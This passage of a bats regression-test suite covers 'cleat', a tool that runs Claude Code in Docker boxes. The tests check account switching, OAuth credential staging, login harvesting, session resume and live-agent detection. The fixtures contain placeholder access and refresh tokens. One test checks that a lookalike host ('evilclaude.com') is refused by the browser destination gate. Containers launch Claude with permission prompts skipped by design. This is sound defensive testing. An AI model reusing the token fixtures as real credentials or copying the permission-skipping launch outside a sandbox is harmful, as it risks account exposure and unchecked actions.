  printf '{"oauthAccount":{"emailAddress":"previous@example.com"},"userID":"abc"}\n' > "$f"
  _daemon_up() { return 0; }
  container_exists() { return 0; }
  is_running() { return 0; }
  _account_box_ready() { return 0; }
  # Not live when the switch first asks, live from then on. A counter, never a
  # sleep: the interleaving is the point, the timing is not.
  _box_has_live_agent() {
    [[ -e "$TEST_TEMP/claude-started" ]] && return 0
    : > "$TEST_TEMP/claude-started"
    return 1
  }
  run _account_do_switch work main "$CN" "$TEST_TEMP/proj"
  assert_success
  assert_output --partial "during the switch"
  assert_output --partial "cleat stop main"
  run jq -r '.oauthAccount.emailAddress' "$f"
  assert_output "previous@example.com"
  run _box_account_read "$CN"
  assert_output "work"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.4.3: the same truncating write in the attach heal, which has shipped since
# v1.1.1. It runs while no claude is live in the box, but a second terminal
# attaching at the same moment starts one that reads the file in the window and
# stops on "Configuration error ... Reset with default configuration"
# (reproduced against 2.1.270).
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.4.3: the attach heal never empties claude.json under a starting Claude" {
  command -v jq >/dev/null || skip "needs jq"
  CLEAT_PROJECTS_DIR="$TEST_TEMP/home/.config/cleat/projects"
  local key f
  mkdir -p "$TEST_TEMP/project"
  key="$(_derive_project_session_key "$TEST_TEMP/project" main)"
  mkdir -p "$CLEAT_PROJECTS_DIR/$key"
  f="$CLEAT_PROJECTS_DIR/$key/claude.json"
  printf '{\n  "hasCompletedOnboarding": false,\n  "oauthAccount": {"emailAddress": "heal@login.dev"},\n  "projects": {"/workspace": {"x": 1}}\n}\n' > "$f"
  rm -f "${HOME}/.claude.json"
  _box_has_live_agent() { return 1; }
  _with_starting_claude() {
    cat() {
      if [[ "${1:-}" == "$f".* ]]; then
        : >> "$TEST_TEMP/copy-seen"
        _looks_like_json_object "$f" || : >> "$TEST_TEMP/claude-saw-bad-json"
      fi
      command cat "$@"
    }
    _refresh_attached_claude_json heal-ctr "$TEST_TEMP/project" main
  }
  run _with_starting_claude
  assert_success
  run test -e "$TEST_TEMP/copy-seen"
  assert_success
  run test -e "$TEST_TEMP/claude-saw-bad-json"
  assert_failure
  run jq -r '.hasCompletedOnboarding' "$f"
  assert_output "true"
  run jq -r '.projects["/workspace"].x' "$f"
  assert_output "1"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.4.3: the heal's live check ran before a rebuild that scans every sibling
# project, so a claude started by another terminal during that scan was written
# under. The check is repeated immediately before the write.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.4.3: the attach heal asks for a live Claude again right before it writes" {
  command -v jq >/dev/null || skip "needs jq"
  CLEAT_PROJECTS_DIR="$TEST_TEMP/home/.config/cleat/projects"
  local key f
  mkdir -p "$TEST_TEMP/project"
  key="$(_derive_project_session_key "$TEST_TEMP/project" main)"
  mkdir -p "$CLEAT_PROJECTS_DIR/$key"
  f="$CLEAT_PROJECTS_DIR/$key/claude.json"
  printf '{"hasCompletedOnboarding":false,"projects":{"/workspace":{"x":1}}}\n' > "$f"
  rm -f "${HOME}/.claude.json"
  _box_has_live_agent() {
    [[ -e "$TEST_TEMP/claude-started" ]] && return 0
    : > "$TEST_TEMP/claude-started"
    return 1
  }
  run _refresh_attached_claude_json heal-ctr "$TEST_TEMP/project" main
  assert_success
  run jq -r '.hasCompletedOnboarding' "$f"
  assert_output "false"
}

# ─────────────────────────────────────────────────────────────────────────────
# `cleat account rm` dropped every pin to the account and left the account's
# oauthAccount in each pinned box's per-project claude.json. The default switch
# already dropped it. The remove could not: it knows those boxes only by
# container name, the name truncates the directory segment and the project path
# is recorded nowhere. A detached box that is still running passes the live
# gate and is never rebuilt, so its next session ran on the shared login under
# the removed account's email. On a host whose own ~/.claude.json has no
# oauthAccount, the stopped-box rebuild kept it too. The pin now carries the
# box's per-project key on a second line.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.5.0: removing an account drops the identity its pinned boxes carry" {
  command -v jq >/dev/null || skip "needs jq"
  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/accounts"
  CLEAT_BOX_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/box-accounts"
  CLEAT_RUN_DIR="$TEST_TEMP/home/.config/cleat/run"
  CLEAT_PROJECTS_DIR="$TEST_TEMP/home/.config/cleat/projects"
  mkdir -p "$CLEAT_ACCOUNTS_DIR" "$CLEAT_BOX_ACCOUNTS_DIR" "$CLEAT_RUN_DIR" "$CLEAT_PROJECTS_DIR"
  _CLEAT_NOW_S=1789000000
  curl() { cat >/dev/null 2>&1; return 7; }
  mkdir -p "$CLEAT_ACCOUNTS_DIR/work" "$TEST_TEMP/proj-a" "$TEST_TEMP/proj-b"
  chmod 700 "$CLEAT_ACCOUNTS_DIR/work"
  printf '{"claudeAiOauth":{"accessToken":"a-token","refreshToken":"r-token","expiresAt":1789003600000,"subscriptionType":"max"}}\n' \
    > "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  chmod 600 "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  # Two boxes in two projects, one of them a named box, pinned through the real
  # switch with the daemon down.
  _daemon_up() { return 1; }
  container_exists() { return 1; }
  _box_has_live_agent() { return 1; }
  local pa="$TEST_TEMP/proj-a" pb="$TEST_TEMP/proj-b" ca cb fa fb
  ca="$(container_name_for "$pa" main)"
  cb="$(container_name_for "$pb" dev)"
  run _account_do_switch work main "$ca" "$pa"
  assert_success
  run _account_do_switch work dev "$cb" "$pb"
  assert_success
  fa="$CLEAT_PROJECTS_DIR/$(_derive_project_session_key "$pa" main)/claude.json"
  fb="$CLEAT_PROJECTS_DIR/$(_derive_project_session_key "$pb" dev)/claude.json"
  mkdir -p "${fa%/*}" "${fb%/*}"
  # What Claude writes into each box once it has fetched the profile as work.
  printf '{"oauthAccount":{"emailAddress":"work@example.com","profileFetchedAt":1789000000000},"userID":"abc","hasCompletedOnboarding":true}\n' > "$fa"
  cp "$fa" "$fb"
  # Both detached and still running: no live claude, so the gate lets it through.
  _daemon_up() { return 0; }
  container_exists() { return 0; }
  is_running() { return 0; }
  _box_has_live_agent() { return 1; }
  run _account_do_remove work 1
  assert_success
  run _box_account_read "$cb"
  assert_output "default"
  run jq -r '.oauthAccount // "absent"' "$fa"
  assert_output "absent"
  run jq -r '.oauthAccount // "absent"' "$fb"
  assert_output "absent"
  # A targeted delete on a live bind source, not a rebuild.
  run jq -r '.userID' "$fb"
  assert_output "abc"
}

# ─────────────────────────────────────────────────────────────────────────────
# An in-box login lands only in that box's per-project claude.json, so an
# unpinned box picks the newest sibling file that has one. A box on a NAMED
# account holds that account's identity there, and the file says nothing about
# whose it is, so the newest pinned sibling stamped every shared-login box with
# the other person's email. concept/44 claimed this guard existed. It did not.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.5.0: an unpinned box never inherits a pinned sibling's account name" {
  command -v jq >/dev/null || skip "needs jq"
  CLEAT_BOX_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/box-accounts"
  CLEAT_PROJECTS_DIR="$TEST_TEMP/home/.config/cleat/projects"
  mkdir -p "$CLEAT_BOX_ACCOUNTS_DIR" "$CLEAT_PROJECTS_DIR"
  printf '{"projects":{}}\n' > "$HOME/.claude.json"
  local pinned_key="pinned-11111111" shared_key="shared-22222222" out
  mkdir -p "$CLEAT_PROJECTS_DIR/$pinned_key" "$CLEAT_PROJECTS_DIR/$shared_key"
  printf '{"oauthAccount":{"emailAddress":"work@example.com"},"hasCompletedOnboarding":true}\n' \
    > "$CLEAT_PROJECTS_DIR/$pinned_key/claude.json"
  printf '{"oauthAccount":{"emailAddress":"shared@example.com"},"hasCompletedOnboarding":true}\n' \
    > "$CLEAT_PROJECTS_DIR/$shared_key/claude.json"
  # The pinned one is the NEWEST, so without the guard it wins the scan.
  touch -t 202601010101.01 "$CLEAT_PROJECTS_DIR/$shared_key/claude.json"
  touch -t 202601010202.02 "$CLEAT_PROJECTS_DIR/$pinned_key/claude.json"
  _box_account_write "cleat-pinned-11111111" work "$pinned_key"
  out="$CLEAT_PROJECTS_DIR/third-33333333/claude.json"
  run _build_project_claude_json "$out"
  assert_success
  run jq -r '.oauthAccount.emailAddress' "$out"
  assert_output "shared@example.com"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.4.3: `cleat login` never signed anyone in. Claude Code has no top-level
# `login` subcommand, so commander read the word as the first PROMPT of an
# interactive session. A signed-in box sent it to the model as a real request
# and kept a conversation called "login". A signed-out one answered "Not logged
# in". Nothing errored, and the command always claimed the shared ~/.claude.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.4.3: cleat login runs claude auth login, never a bare login prompt" {
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"
  _host_open_cmd() { echo ""; }
  run cmd_login "$TEST_TEMP/project"
  assert_success
  run grep -c -e "-- claude auth login\$" "$DOCKER_CALLS"
  assert_output "1"
  run grep -c -e "-- claude login\$" "$DOCKER_CALLS"
  assert_output "0"
}

# A pinned box whose `docker exec` of `claude auth login` does what Claude Code
# does: write the store the override names. $1 = 1 to write, 0 to write nothing.
_b13_pinned_login_box() {
  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/accounts"
  CLEAT_BOX_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/box-accounts"
  CLEAT_RUN_DIR="$TEST_TEMP/home/.config/cleat/run"
  mkdir -p "$CLEAT_ACCOUNTS_DIR" "$CLEAT_BOX_ACCOUNTS_DIR" "$CLEAT_RUN_DIR" "$TEST_TEMP/project"
  _B13_CNAME="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$_B13_CNAME"
  _host_open_cmd() { echo ""; }
  _daemon_up() { return 0; }
  container_exists() { return 0; }
  _account_ensure_dir fresh
  _box_account_write "$_B13_CNAME" fresh
  _B13_STAGED="$(_account_box_auth_dir "$_B13_CNAME")/.credentials.json"
  _B13_WRITES="$1"
  # The harvest asks the server whose login this is. A shell function also
  # satisfies the `command -v curl` guard on a host with no curl at all.
  curl() { cat >/dev/null 2>&1; return 7; }
  _account_profile_curl() {
    printf '{"account":{"uuid":"0b8f2a6e-1c3d-4e5f-8a9b-0c1d2e3f4a5b","email":"fresh@example.com"},"organization":{"uuid":"org-1","name":"Acme Ltd","cc_onboarding_flags":{}}}\n200'
  }
  docker() {
    case "$1" in
      inspect) printf '%s\n' "/home/coder/.cleat-auth" ;;
      exec)
        if [[ "$_B13_WRITES" == 1 && "$*" == *"CLAUDE_SECURESTORAGE_CONFIG_DIR="*"-- claude auth login" ]]; then
          mkdir -p "${_B13_STAGED%/*}"
          printf '{"claudeAiOauth":{"accessToken":"sk-ant-oat01-b13","refreshToken":"sk-ant-ort01-b13","expiresAt":%s,"subscriptionType":"max"}}\n' \
            "$(( ($(date +%s) + 28800) * 1000 ))" > "$_B13_STAGED"
        fi
        command docker "$@" ;;
      *) command docker "$@" ;;
    esac
  }
}

@test "regression v1.4.3: cleat login on a pinned box saves the login into the account, not ~/.claude" {
  # The login lands in the box's staged copy and nothing harvested it. The
  # account still read "signed out" and the next attach's staging deleted the
  # new login. The success line named the shared ~/.claude it never touched.
  _b13_pinned_login_box 1
  run cmd_login "$TEST_TEMP/project"
  assert_success
  assert_output --partial "Auth saved to account"
  refute_output --partial "~/.claude"
  run _account_auth_state fresh
  assert_output "ok"
  run grep -c "sk-ant-ort01-b13" "$(_account_cred_path fresh)"
  assert_output "1"
}

@test "regression v1.4.3: cleat login never reports a login saved that did not reach the pinned account" {
  # The store override is an undocumented Claude Code variable. A Claude that
  # exits 0 without writing the relocated store must not be reported as a login
  # saved under the account's name.
  _b13_pinned_login_box 0
  run cmd_login "$TEST_TEMP/project"
  assert_success
  assert_output --partial "did not reach account"
  refute_output --partial "Auth saved"
}

@test "regression v1.4.3: a failed cleat login exits non-zero and claims nothing" {
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"
  _host_open_cmd() { echo ""; }
  export DOCKER_EXIT_CODE=1
  run cmd_login "$TEST_TEMP/project"
  assert_failure
  refute_output --partial "Auth saved"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.0: the browser destination gate shipped without the hosts Claude Code
# 2.1.270 actually authorizes at (claude.com and platform.claude.com). The gate
# refused the one login Cleat ships a bridge FOR, so the watcher never opened
# the URL and never started the callback proxy, and every login fell back to
# pasting a code by hand while `cleat login` promised the browser would open.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.5.0: the Claude authorize URL opens through the browser bridge" {
  local u
  u="https://claude.com/cai/oauth/authorize?code=true&redirect_uri=http%3A%2F%2Flocalhost%3A40701%2Fcallback"
  run _bridge_dest_allowed "$u"
  assert_success
  run _is_auth_url "$u"
  assert_success
  run _extract_callback_port "$u"
  assert_output "40701"
  u="https://platform.claude.com/oauth/authorize?code=true&redirect_uri=https%3A%2F%2Fplatform.claude.com%2Foauth%2Fcode%2Fcallback"
  run _bridge_dest_allowed "$u"
  assert_success
  run _is_auth_url "$u"
  assert_success
  # Exact hosts, never a suffix: a neighbour that merely ends in the same name
  # is still refused.
  run _bridge_dest_allowed "https://evilclaude.com/cai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1%2Fcallback"
  assert_failure
  run _bridge_dest_allowed "https://auth.claude.com/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1%2Fcallback"
  assert_failure
}

@test "regression v1.4.3: resume does not reopen a conversation that is open in another terminal" {
  # cmd_resume ran `claude --continue`, which reopens the newest conversation in
  # the box's folder and skips a live one only when it is a BACKGROUND session.
  # With a second Claude still working in another terminal of the same box, the
  # newest conversation was that terminal's: the resumed process opened it,
  # registered the same session id, and both appended divergent histories to one
  # transcript (Claude Code 2.1.270 lab: 6/6 in the account investigation, 2/2
  # again on the v1.4.3 argv). Resume now names the newest conversation that no
  # live process holds.
  mkdir -p "$TEST_TEMP/project"
  local cname sdir mine="11111111-1111-4111-8111-111111111111" other="22222222-2222-4222-8222-222222222222" id
  cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"
  mock_docker_ps_a "$cname"
  sdir="$(_sessions_key_dir "$TEST_TEMP/project" main)"
  mkdir -p "$sdir"
  for id in "$mine" "$other"; do
    printf '%s\n' '{"parentUuid":null,"isSidechain":false,"type":"user","message":{"role":"user","content":"hi"},"entrypoint":"cli","sessionId":"'"$id"'"}' > "$sdir/$id.jsonl"
  done
  # Mine ended first; the other terminal wrote after that.
  touch -t 202601010000 "$sdir/$mine.jsonl"
  _box_live_session_ids() { printf '%s\n' "22222222-2222-4222-8222-222222222222"; }

  run cmd_resume "$TEST_TEMP/project"
  assert_success
  run assert_docker_exec_has "--dangerously-skip-permissions --resume $mine"
  assert_success
  run grep -F -- "$other" "$DOCKER_CALLS"
  assert_failure
  run grep -F -- "--continue" "$DOCKER_CALLS"
  assert_failure
}

@test "regression v1.4.3: resume keeps the 1M context the conversation ran on" {
  # Claude Code restores a resumed conversation's model from its last assistant
  # message, which records the bare id, and re-adds [1m] only when a model is
  # configured with it. On the default model nothing is, so `cleat resume`
  # brought an "Opus 5 (1M context)" conversation back as "Opus 5" and every
  # request lost the context-1m beta (lab: 4/4 x3, 2/2 critic, 2/2 again here).
  # The run's own usage record names the model it really ran, and resume now
  # passes it back.
  mkdir -p "$TEST_TEMP/project"
  local cname sdir id="11111111-1111-4111-8111-111111111111"
  cname="$(container_name_for "$TEST_TEMP/project")"
  is_running() { return 1; }
  mock_docker_ps_a "$cname"
  mkdir -p "$CLEAT_RUN_DIR/${cname}/settings"
  echo '{}' > "$CLEAT_RUN_DIR/${cname}/settings/settings.json"
  sdir="$(_sessions_key_dir "$TEST_TEMP/project" main)"
  mkdir -p "$sdir"
  printf '%s\n' \
    '{"parentUuid":null,"isSidechain":false,"type":"user","message":{"role":"user","content":"hi"},"entrypoint":"cli","sessionId":"'"$id"'"}' \
    '{"parentUuid":"u1","isSidechain":false,"message":{"id":"m1","type":"message","role":"assistant","model":"claude-opus-5","content":[]},"type":"assistant","sessionId":"'"$id"'"}' \
    '{"type":"cost-state","sessionId":"'"$id"'","modelUsage":{"claude-opus-5[1m]":{"inputTokens":12}}}' > "$sdir/$id.jsonl"

  run cmd_resume "$TEST_TEMP/project"
  assert_success
  run assert_docker_exec_has "--resume $id --model claude-opus-5[1m]"
  assert_success
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.4.3: _box_has_live_agent grepped the WHOLE `docker top` output for
# claude|node, so any node process read as a live Claude session. Claude exits,
# a `vite --host` (or an MCP server, or a shell Claude's Bash tool started)
# stays up, and the box is "live" forever: the idle sweep never reclaims it and
# the attach heal never runs (both released), `cleat account` refuses with
# "main has a live Claude session" and a session delete refuses (both
# unreleased). Found by the maintainer on a real box, 2026-09-13.
#
# The fix judges only the command column, and only by its executable
# (_is_claude_argv). The fixture is what `docker top` prints for that box: the
# cleat PID 1 chain plus four leftovers, each a different decoy. The node one
# is the reported bug. The .claude/ paths (a plugin's MCP and LSP servers, a
# shell Claude's Bash tool started) are what a grep for claude alone still
# matched. The user name in the UID column is what a native Linux host prints
# when its user is called claude.
# ─────────────────────────────────────────────────────────────────────────────
_b17_top_after_claude_exited() {
  printf '%s\n' \
    'UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD' \
    'root                48213               48190               0                   09:14               ?                   00:00:00            /sbin/docker-init -- /entrypoint.sh bash' \
    'root                48260               48213               0                   09:14               ?                   00:00:00            su -s /bin/bash coder' \
    'claude              48262               48260               0                   09:14               ?                   00:00:00            bash' \
    'claude              50111               48213               0                   09:40               ?                   00:00:04            node /workspace/node_modules/.bin/vite --host' \
    'claude              50200               48213               0                   09:41               ?                   00:00:01            node /home/coder/.claude/plugins/cache/acme/mcp/dist/index.js' \
    'claude              50250               48213               0                   09:41               ?                   00:00:00            /home/coder/.claude/plugins/cache/acme/bin/acme-lsp --stdio' \
    "claude              50300               48213               0                   09:41               ?                   00:00:00            /bin/bash -c source /home/coder/.claude/shell-snapshots/snapshot-bash-1789295352419-hrzih4.sh 2>/dev/null || true && eval 'python3 -m http.server 8000' < /dev/null"
}

@test "regression v1.4.3: a leftover node dev server does not keep a detached box out of the idle sweep" {
  docker() {
    case "$1" in
      top)     _b17_top_after_claude_exited ;;
      inspect) echo 0 ;;
      stop)    printf '%s\n' "$*" >> "$TEST_TEMP/stopped" ;;
    esac
    return 0
  }
  run _box_has_live_agent "cleat-dev-11111111"
  assert_failure

  _running_cleat_boxes() { printf '%s\n' "cleat-dev-11111111"; }
  _path_mtime() { echo 1000; }            # detached long past the grace window
  run _sweep_idle_boxes "" 1800
  assert_success
  assert_output --partial "Stopped 1 idle session"
  run cat "$TEST_TEMP/stopped"
  assert_output "stop cleat-dev-11111111"

  # The same box with Claude still running in it must stay untouchable. This is
  # the "leave it running, walk away" promise the gate exists for.
  : > "$TEST_TEMP/stopped"
  docker() {
    case "$1" in
      top) _b17_top_after_claude_exited
           printf '%s\n' 'claude              50400               50390               0                   09:45               pts/0               00:00:09            claude --dangerously-skip-permissions --continue' ;;
      stop) printf '%s\n' "$*" >> "$TEST_TEMP/stopped" ;;
    esac
    return 0
  }
  run _sweep_idle_boxes "" 1800
  refute_output --partial "Stopped"
  [ ! -s "$TEST_TEMP/stopped" ]
}

@test "regression v1.5.0: cleat account switches a box whose only node process is a dev server" {
  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/accounts"
  CLEAT_BOX_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/box-accounts"
  CLEAT_RUN_DIR="$TEST_TEMP/home/.config/cleat/run"
  CLEAT_PROJECTS_DIR="$TEST_TEMP/home/.config/cleat/projects"
  mkdir -p "$CLEAT_ACCOUNTS_DIR/b" "$CLEAT_BOX_ACCOUNTS_DIR" "$CLEAT_RUN_DIR" "$CLEAT_PROJECTS_DIR"
  chmod 700 "$CLEAT_ACCOUNTS_DIR/b"
  _CLEAT_NOW_S=1789000000
  _has_unicode() { return 1; }
  curl() { cat >/dev/null 2>&1; return 7; }
  printf '{"claudeAiOauth":{"accessToken":"at-B0","refreshToken":"rt-B","expiresAt":1789003600000,"subscriptionType":"max"}}\n' \
    > "$CLEAT_ACCOUNTS_DIR/b/.credentials.json"
  chmod 600 "$CLEAT_ACCOUNTS_DIR/b/.credentials.json"
  # The box is up and the only thing left running in it is a dev server.
  _daemon_up() { return 0; }
  container_exists() { return 0; }
  is_running() { return 0; }
  docker() {
    case "$1" in
      top)     _b17_top_after_claude_exited ;;
      inspect) printf '%s\n' "/home/coder/.cleat-auth" ;;
    esac
    return 0
  }
  run _account_do_switch b main "cleat-proj-abcdef12" "$TEST_TEMP/proj"
  assert_success
  refute_output --partial "live Claude session"
  run _box_account_read "cleat-proj-abcdef12"
  assert_output "b"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.4.3: enabling a kit on a STOPPED box said "A session is live in this box".
# `docker top` fails on a stopped container and _box_has_live_agent maps any
# failure to "live", which is right for a gate and wrong for a note. The note
# lacked the is_running term every other caller carries.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.4.3: enabling a kit on a stopped box does not claim a live session" {
  CLEAT_RUN_DIR="$CLEAT_CONFIG_DIR/run"
  CLEAT_KITS_DIR="$CLEAT_CONFIG_DIR/kits"
  CLEAT_BOXES_DIR="$CLEAT_CONFIG_DIR/boxes"
  CLEAT_PROJECTS_DIR="$CLEAT_CONFIG_DIR/projects"
  mkdir -p "$TEST_TEMP/project"
  cd "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps ""
  mock_docker_ps_a "$cname"
  _container_has_kit_mounts() { return 0; }
  DOCKER_EXIT_CODE=1   # every docker call the stub does not special-case fails, top included
  export DOCKER_EXIT_CODE
  run cmd_kit plan-big-execute-small <<< "y"
  assert_success
  refute_output --partial "A session is live in this box"
  assert_output --partial "Takes effect next session"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.0 (account switching): on a host with no jq a pinned box kept
# or gained the wrong identity. _account_invalidate_identity returned at once
# without jq, and the builder's no-jq branch kept the persisted copy or copied
# the host file whole, so the box launched carrying the previous account's (or
# the host's) oauthAccount. That name is what Claude shows, and its
# organisation goes out with the new account's token. The host still has no jq
# after the fix: the BOX's own jq does the transform, at the switch when the
# box is running and just before the next launch otherwise.
# ─────────────────────────────────────────────────────────────────────────────

# A jq-less host whose box has jq. The stand-in answers exactly the in-box
# filter call with the real binary and hands every other docker call to the
# stub, so nothing else changes behaviour.
_b12_setup() {
  command -v jq >/dev/null || skip "needs jq to stand in for the box's own"
  _B12_JQ="$(command -v jq)"
  _B12_PROJ="$TEST_TEMP/proj"
  mkdir -p "$_B12_PROJ"
  _B12_CN="$(container_name_for "$_B12_PROJ" main)"
  _B12_KEY="$(_derive_project_session_key "$_B12_PROJ" main)"
  mkdir -p "$CLEAT_PROJECTS_DIR/$_B12_KEY"
  _B12_F="$CLEAT_PROJECTS_DIR/$_B12_KEY/claude.json"
  # No switch here has a login to harvest, so nothing should reach the network.
  # If anything ever does, it fails instead of asking a real Anthropic host.
  curl() { cat >/dev/null 2>&1; return 7; }
  _account_usage_fetch() { return 0; }
  _box_has_live_agent() { return 1; }
  _account_box_ready() { return 0; }
  _hide_jq
}
_b12_box_stopped() {
  _daemon_up() { return 1; }
  container_exists() { return 1; }
  is_running() { return 1; }
}
_b12_box_running() {
  _daemon_up() { return 0; }
  container_exists() { return 0; }
  is_running() { return 0; }
  docker() {
    if [ "$1" = exec ] && [ "$2" = -i ] && [ "$4" = jq ]; then
      shift 4
      "$_B12_JQ" "$@"
      return
    fi
    command docker "$@"
  }
}
_b12_identity() { "$_B12_JQ" -r '.oauthAccount.emailAddress // "absent"' "$_B12_F"; }

@test "regression v1.5.0: a jq-less host clears the old account from a box switched while stopped" {
  _b12_setup
  _b12_box_stopped
  _account_ensure_dir a
  _box_account_write "$_B12_CN" a "$_B12_KEY"
  printf '{"oauthAccount":{"emailAddress":"a@example.com","organizationUuid":"org-a","profileFetchedAt":9999999999999},"userID":"abc","cachedUsageUtilization":{"x":1}}\n' > "$_B12_F"
  run _account_do_switch b main "$_B12_CN" "$_B12_PROJ"
  assert_success
  # The next start: the rebuild runs while the box is stopped, then the box
  # comes up and the launch hook runs.
  _refresh_project_claude_json "$_B12_PROJ" main
  _b12_box_running
  # The real launch path, not the hook on its own: exec_claude is what has to
  # reach the file before Claude does.
  _RESOLVED_PROJECT="$_B12_PROJ"
  _BOX=main
  run exec_claude "$_B12_CN" --dangerously-skip-permissions
  run _b12_identity
  assert_output "absent"
  run "$_B12_JQ" -r '.cachedUsageUtilization // "absent"' "$_B12_F"
  assert_output "absent"
  # A targeted delete, not a reset: the rest of the file survives.
  run "$_B12_JQ" -r '.userID' "$_B12_F"
  assert_output "abc"
}

@test "regression v1.5.0: a jq-less host clears the old account at the switch when the box is running" {
  _b12_setup
  _b12_box_running
  _account_ensure_dir a
  _box_account_write "$_B12_CN" a "$_B12_KEY"
  printf '{"oauthAccount":{"emailAddress":"a@example.com"},"userID":"abc"}\n' > "$_B12_F"
  local before after
  before="$(ls -i "$_B12_F" | awk '{print $1}')"
  run _account_do_switch b main "$_B12_CN" "$_B12_PROJ"
  assert_success
  run _b12_identity
  assert_output "absent"
  # The box binds this file, so the edit has to keep its inode.
  after="$(ls -i "$_B12_F" | awk '{print $1}')"
  [ "$before" = "$after" ] || { echo "inode changed under a running box"; return 1; }
}

@test "regression v1.5.0: a box created pinned on a jq-less host does not launch with the host account" {
  _b12_setup
  _account_ensure_dir work
  _box_account_write "$_B12_CN" work "$_B12_KEY"
  printf '{"oauthAccount":{"emailAddress":"host@example.com"},"userID":"abc"}\n' > "$HOME/.claude.json"
  _build_project_claude_json "$_B12_F" "" "$_B12_CN"
  _b12_box_running
  run _refresh_attached_claude_json "$_B12_CN" "$_B12_PROJ" main
  assert_success
  run _b12_identity
  assert_output "absent"
  run "$_B12_JQ" -r '.userID' "$_B12_F"
  assert_output "abc"
}

@test "regression v1.5.0: a jq-less host clears the named account from a stopped box put back on the shared login" {
  _b12_setup
  _b12_box_stopped
  _account_ensure_dir a
  _box_account_write "$_B12_CN" a "$_B12_KEY"
  printf '{"oauthAccount":{"emailAddress":"host@example.com"},"userID":"abc"}\n' > "$HOME/.claude.json"
  printf '{"oauthAccount":{"emailAddress":"a@example.com"},"userID":"abc"}\n' > "$_B12_F"
  run _account_do_switch default main "$_B12_CN" "$_B12_PROJ"
  assert_success
  # An unpinned box is not flagged by the rebuild, so only the switch's own
  # flag can carry this one to the launch.
  _refresh_project_claude_json "$_B12_PROJ" main
  _b12_box_running
  run _refresh_attached_claude_json "$_B12_CN" "$_B12_PROJ" main
  assert_success
  run _b12_identity
  assert_output "absent"
}

@test "regression v1.5.0: the jq-less identity clear never edits the file under a live Claude" {
  # A config write racing the in-place copy puts the old name straight back,
  # and a delete under a live Claude Code freezes its own later saves of that
  # file. The next launch tries again.
  _b12_setup
  _b12_box_stopped
  _account_ensure_dir a
  _box_account_write "$_B12_CN" a "$_B12_KEY"
  printf '{"oauthAccount":{"emailAddress":"a@example.com"},"userID":"abc"}\n' > "$_B12_F"
  run _account_do_switch b main "$_B12_CN" "$_B12_PROJ"
  assert_success
  _b12_box_running
  _box_has_live_agent() { return 0; }
  run _refresh_attached_claude_json "$_B12_CN" "$_B12_PROJ" main
  assert_output --partial "still carries another account"
  run _b12_identity
  assert_output "a@example.com"
  # And the next launch, with the session gone, still clears it.
  _box_has_live_agent() { return 1; }
  run _refresh_attached_claude_json "$_B12_CN" "$_B12_PROJ" main
  refute_output --partial "still carries another account"
  run _b12_identity
  assert_output "absent"
}

# ─────────────────────────────────────────────────────────────────────────────
# Two boxes on ONE account, the shipped Boxes plus cleat account combination.
# Claude rotates the refresh token on nearly every refresh, so the box that
# refreshed last advanced the store and the OTHER box was left staged on the
# generation before it. The attach read that as "a login this account does not
# have": it warned on the terminal, kept a copy of a live refresh token for
# thirty days and offered to adopt it as a separate account. Every attach of
# the box that fell behind did it again, so the copies piled up. The same hold
# fired from the release path on `cleat account default` and on a re-pin.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.5.0: a box staged on a generation its account already replaced is not held" {
  _acct_race_setup
  local mode acct a b c store staged_a staged_b staged_c
  for mode in jq nojq; do
    [[ "$mode" == nojq ]] && _hide_jq
    acct="work-$mode"
    a="cleat-main-$mode"; b="cleat-api-$mode"; c="cleat-docs-$mode"
    store="$CLEAT_ACCOUNTS_DIR/$acct/.credentials.json"
    staged_a="$CLEAT_RUN_DIR/$a/auth/.credentials.json"
    staged_b="$CLEAT_RUN_DIR/$b/auth/.credentials.json"
    staged_c="$CLEAT_RUN_DIR/$c/auth/.credentials.json"
    # One account, one login, three boxes pinned to it, all on generation 1.
    _acct_race_cred "$store" "G1$mode" a 1789003600000
    _acct_race_cred "$staged_a" "G1$mode" a 1789003600000
    _acct_race_cred "$staged_b" "G1$mode" a 1789003600000
    _acct_race_cred "$staged_c" "G1$mode" a 1789003600000
    _box_account_write "$a" "$acct"
    _box_account_write "$b" "$acct"
    _box_account_write "$c" "$acct"
    printf 'uuid\t%s\nwho\tlab-a@lab.invalid\n' "$_ACCT_UUID_A" > "$CLEAT_ACCOUNTS_DIR/$acct/meta"
    _acct_ident_profile "$_ACCT_UUID_A" lab-a@lab.invalid
    # Box A's Claude refreshes. The refresh token rotates, so the store and the
    # two other boxes are a generation behind from here on.
    _acct_race_cred "$staged_a" "G2$mode" a 1789028800000
    run _account_sync_out "$a"
